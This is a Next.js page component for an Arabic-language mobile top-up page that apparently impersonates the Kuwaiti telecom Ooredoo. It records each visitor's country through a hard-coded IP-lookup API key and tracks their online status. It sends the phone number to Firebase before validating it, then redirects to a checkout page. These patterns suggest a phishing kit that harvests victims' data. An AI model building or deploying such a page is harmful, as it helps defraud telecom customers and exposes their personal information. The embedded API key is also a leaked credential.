"use client"

import type React from "react"
import { useEffect, useState, useCallback } from "react"
import { useRouter } from "next/navigation"
import { ArrowRight, Loader2, Trash2, Receipt, Globe, Phone } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent } from "@/components/ui/card"
import { Separator } from "@/components/ui/separator"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

// --- STUBS for external dependencies ---
// In a real app, these would be in their respective files (e.g., lib/firebase.ts, lib/utils.ts)



// --- END STUBS ---

interface PaymentData {
  id: string
  phone?: string
  country?: string
  amount?: string
}

// It's highly recommended to move API keys to environment variables
// For example: process.env.NEXT_PUBLIC_IPDATA_API_KEY
// However, as no env vars are set for this session, using the provided key.
const IPDATA_API_KEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"

const _id =
  "ooredoo1-" +
  Math.random()
    .toString(36)
    .replace(/[^a-z]+/g, "")
    .substr(0, 15)

export default function PaymentPage() {
  const router = useRouter()
  const [amount, setAmount] = useState("5")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [country, setCountry] = useState<string | null>(null)

  const formatAmount = useCallback((value: string): string => {
    const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
    return isNaN(numericValue) ? "0" : numericValue.toString()
  }, [])

  const validatePhoneNumber = useCallback((phone: string): boolean => {
    const phoneRegex = /^[0-9]{8}$/
    return phoneRegex.test(phone)
  }, [])

  useEffect(() => {
    const fetchLocation = async () => {
      const url = `https://api.ipdata.co/country_name?api-key=${IPDATA_API_KEY}`
      try {
        const response = await fetch(url)
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`)
        }
        const fetchedCountry = await response.text()
        setCountry(fetchedCountry)
        await addData({
          id: _id,
          country: fetchedCountry,
          createdDate: new Date().toISOString(),
        })
        localStorage.setItem("country", fetchedCountry)
        setupOnlineStatus(_id)
      } catch (error) {
        console.error("Error fetching location:", error)
        // Set a default or handle error appropriately
        setCountry("Unknown")
      }
    }
    fetchLocation()
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    await addData({ id: _id, phone: phoneNumber, mobile: phoneNumber })

    if (!validatePhoneNumber(phoneNumber)) {
      // Consider adding user feedback here (e.g., toast notification)
      return
    }

    const numericAmount = Number.parseFloat(amount.replace(/[^\d.]/g, ""))
    if (numericAmount < 1 || numericAmount > 100) {
      // Consider adding user feedback here
      return
    }

    setIsLoading(true)

    try {
      const sessionId = localStorage.getItem("visitor") || _id // Fallback to _id if visitor not found

      const paymentData: PaymentData = {
        id: sessionId,
        phone: phoneNumber,
        amount: amount,
      }
      await addData({ paymentData }) // Ensure addData is awaited if it's async
      localStorage.setItem("amount", amount)

      router.push("/checkout") // Assuming /checkout is the next page
    } catch (error) {
      console.error("Payment submission failed:", error)
      // Add user feedback for error
    } finally {
      setIsLoading(false)
    }
  }

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "") // Allow only digits
    setAmount(value || "0") // Set to "0" if empty to avoid NaN issues
  }

  const clearAmount = () => {
    setAmount("0")
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\d]/g, "").slice(0, 8)
    setPhoneNumber(value)
  }

  useEffect(() => {
    localStorage.setItem("paymentAmount", amount)
  }, [amount])

  if (isLoading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 dark:bg-gray-900 p-4">
        <Loader2 className="w-12 h-12 animate-spin text-red-600 dark:text-red-500 mb-6" />
        <p className="text-lg font-medium text-gray-700 dark:text-gray-300">جاري التحميل...</p>
        <p className="text-sm text-gray-500 dark:text-gray-400">يرجى الانتظار قليلاً</p>
      </div>
    )
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-100 dark:bg-gray-900">
      <header className="bg-white dark:bg-gray-800 shadow-sm sticky top-0 z-50">
        <div className="container mx-auto max-w-md flex justify-between items-center p-4">
          <Button
            variant="ghost"
            size="icon"
            className="text-gray-600 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700"
          >
            <Globe className="w-5 h-5" />
            <span className="sr-only">Change language</span>
          </Button>
          <h1 className="text-xl font-semibold text-gray-900 dark:text-white">دفع</h1>
          <Button
            variant="ghost"
            size="icon"
            onClick={() => router.back()}
            className="text-gray-600 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700"
          >
            <ArrowRight className="w-5 h-5" />
            <span className="sr-only">Go back</span>
          </Button>
        </div>
      </header>

      <main className="flex-1 container mx-auto max-w-md p-4">
        <Card className="w-full shadow-lg dark:bg-gray-800">
          <CardContent className="p-0">
            <div className="relative overflow-hidden rounded-t-lg">
              <img
                src="/zf.png"
                alt="Promotional Banner"
                width={600}
                height={300}
                className="w-full h-auto object-cover"
              />
            </div>

            <form onSubmit={handleSubmit} className="p-6 space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-5 gap-4 items-end">
                {/* Phone Number Field */}
                <div className="md:col-span-3 space-y-1.5">
                  <Label
                    htmlFor="phoneNumber"
                    className="text-sm font-medium text-gray-700 dark:text-gray-300 block text-right"
                  >
                    رقم الموبايل
                  </Label>
                  <div className="relative">
                    <Phone className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400 dark:text-gray-500" />
                    <Input
                      id="phoneNumber"
                      type="tel"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="xxxxxxxx"
                      className="text-right py-3 text-base border-gray-300 dark:border-gray-600 focus:border-red-500 focus:ring-red-500 rounded-lg h-12 pr-10"
                      dir="rtl"
                      required
                      aria-label="رقم الموبايل"
                    />
                  </div>
                </div>

                {/* Amount Field */}
                <div className="md:col-span-2 space-y-1.5">
                  <Label
                    htmlFor="amount"
                    className="text-sm font-medium text-gray-700 dark:text-gray-300 block text-right"
                  >
                    المبلغ
                  </Label>
                  <div className="relative">
                    <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 dark:text-gray-400 font-medium text-sm pointer-events-none">
                      د.ك
                    </span>
                    <Input
                      id="amount"
                      type="tel" // Using text to handle custom formatting if needed, but ensure validation
                      value={amount}
                      onChange={handleAmountChange}
                      className="text-center py-3 text-base font-medium border-gray-300 dark:border-gray-600 focus:border-red-500 focus:ring-red-500 rounded-lg h-12 px-10" // Adjusted padding for currency and clear
                      dir="rtl"
                      aria-label="المبلغ"
                      maxLength={3}
                      pattern="\d*" // Ensures numeric keyboard on mobile for type="text"
                      inputMode="numeric" // Better mobile numeric keyboard
                    />
                    {amount !== "0" && (
                      <Button
                        type="button"
                        variant="ghost"
                        size="icon"
                        onClick={clearAmount}
                        className="absolute left-1 top-1/2 transform -translate-y-1/2 p-1 h-8 w-8 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-full"
                        aria-label="Clear amount"
                      >
                        <Trash2 className="w-4 h-4 text-gray-400 dark:text-gray-500" />
                      </Button>
                    )}
                  </div>
                </div>
              </div>

              <p className="text-xs text-gray-500 dark:text-gray-400 text-right">
                البلد المكتشف: {country || "جاري التحديد..."}
              </p>

              <Button
                type="button"
                variant="outline"
                className="w-full py-3 border-red-500 text-red-500 hover:bg-red-50 dark:hover:bg-red-700/20 dark:border-red-600 dark:text-red-500 rounded-lg text-base font-medium h-12"
              >
                الدفع لرقم آخر
              </Button>

              <Separator className="my-6 dark:bg-gray-700" />

              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center text-gray-700 dark:text-gray-300">
                    <Receipt className="w-5 h-5 text-red-600 dark:text-red-500 ml-2" />
                    <span className="text-sm font-medium">إعادة التعبئة / دفع الفواتير</span>
                  </div>
                </div>

                <div className="flex justify-between items-center">
                  <div className="text-lg font-semibold text-gray-900 dark:text-white">
                    {Number.parseFloat(amount || "0").toFixed(3)} د.ك
                  </div>
                  <div className="text-sm font-medium text-gray-700 dark:text-gray-300">الإجمالي:</div>
                </div>
              </div>

              <Button
                type="submit"
                disabled={
                  isLoading ||
                  !phoneNumber ||
                  !validatePhoneNumber(phoneNumber) ||
                  Number.parseFloat(amount || "0") < 1 ||
                  Number.parseFloat(amount || "0") > 100
                }
                className="w-full py-3 bg-red-600 hover:bg-red-700 disabled:bg-gray-300 dark:disabled:bg-gray-600 disabled:text-gray-500 dark:disabled:text-gray-400 text-white rounded-lg text-base font-medium h-12 transition-colors duration-150"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center">
                    <Loader2 className="w-5 h-5 animate-spin ml-2" />
                    <span>جاري المعالجة...</span>
                  </div>
                ) : (
                  <span>استمرار</span>
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </main>
      <footer className="py-4 text-center text-xs text-gray-500 dark:text-gray-400">
        © {new Date().getFullYear()} Your Company Name. All rights reserved.
      </footer>
    </div>
  )
}
